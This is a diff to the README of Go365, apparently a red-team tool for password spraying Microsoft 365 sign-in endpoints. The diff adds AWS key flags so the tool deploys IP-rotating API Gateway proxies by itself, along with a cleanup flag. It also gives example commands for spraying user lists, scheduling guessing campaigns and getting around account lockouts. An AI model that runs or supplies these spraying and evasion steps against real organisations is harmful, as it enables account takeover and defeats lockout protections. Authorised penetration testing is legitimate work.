@@ -124,6 +124,15 @@ Usage:
                                 : check this out: https://bigb0sss.github.io/posts/redteam-rotate-ip-aws-gateway/
                                 : (-url https://notrealgetyourown.execute-api.us-east-2.amazonaws.com/login)
 
+    -ak <string>                AWS Access Key
+                                : Used for automatic API gateway deployment
+
+    -sk <string>                AWS Secret Key
+                                : Used for automatic API gateway deployment.
+
+    -cleanup                    Cleanup AWS gateways
+                                : Cleans up automatically deployed AWS gateways. -ak and -sk are required for this flag.
+
     -debug                      Debug mode.
                                 : Print xml response
 ```
@@ -137,9 +146,12 @@ Usage:
   ./Go365 -endpoint graph -u legituser -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxy 127.0.0.1:1080
   ./Go365 -endpoint rst -u legituser -pl ./pass_list.txt -delay 1800 -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxyfile ./proxyfile.txt
   ./Go365 -endpoint graph -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -url https://notrealgetyourown.execute-api.us-east-2.amazonaws.com/login
+  ./Go365 -endpoint graph -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -ak <AWS access key> -sk <AWS secret key>
 
   You can even schedule out your entire password guessing campaign using the -pl and -delay flags :)
   ./Go365 -endpoint rst -ul ./user_list.txt -d pwnthisfakedomain.com -w 5 -o Go365output.txt -url https://notrealgetyourown.execute-api.us-east-2.amazonaws.com/login -proxyfile listofprox.txt -pl listofpasswords.txt -delay 7200
+
+  
 
   *Protip: If you get a lot of "Account locked out" responses, then you might wanna proxy or use an AWS Gateway.
 ```
@@ -199,6 +211,32 @@ The tool will randomly iterate through the provided proxy servers and wait for t
 
 #### Amazon API Gateway
 
-Additionally, an endpoint url may be specified so this tool can interface with Amazon API Gateway. Setup a gateway to point to the `https://login.microsoftonline.com/rst2.srf` endpoint, then set the -url parameter to the provided `Invoke URL`. Your IP should be rotated with each request.
+It is possible to automatically deploy an AWS gateway by providing an AWS access and secret key:
+
+`-ak <Access Key> -sk <Secret Key>`
+
+```
+[i] Automatic AWS gateway configured
+[i] Using the rst endpoint...
+[i] AWS Gateway created: https://<endpointID>.execute-api.us-east-1.amazonaws.com:443/proxy
+[i] Remember to delete gateway using -cleanup flag!
+[rst] [-] User not found: test.user90@pwnthisfakedomain.com
+```
+
+This will deploy a gateway that rotates the IP address with each request that points to the endpoint specified with the -endpoint flag.
+
+After the tool has completed execution, the gateway can be deleted using the cleanup flag. This will loop through all the created endpoints and delete them. If the tool hits the AWS API rate limit, it will sleep for 10 seconds before trying to continue deletion:
+
+`-ak <Access Key> -sk <Secret Key> -cleanup`
+
+```
+[-] Deleting API "proxy", with ID "sip5q09s76"
+[-] Deleting API "proxy", with ID "z0cgsq6f86"
+[!] API Throttled in region us-east-1 sleeping for 10 seconds...
+[-] Deleting API "proxy", with ID "z0cgsq6f86"
+[i] Cleanup complete!
+```
+
+Additionally, an endpoint url may be specified so this tool can interface with Amazon API Gateway by providing the URL directly. Setup a gateway to point to the `https://login.microsoftonline.com/rst2.srf` endpoint, then set the -url parameter to the provided `Invoke URL`. Your IP should be rotated with each request.
 
 `-url https://justanexample.execute-api.us-east-2.amazonaws.com/login`
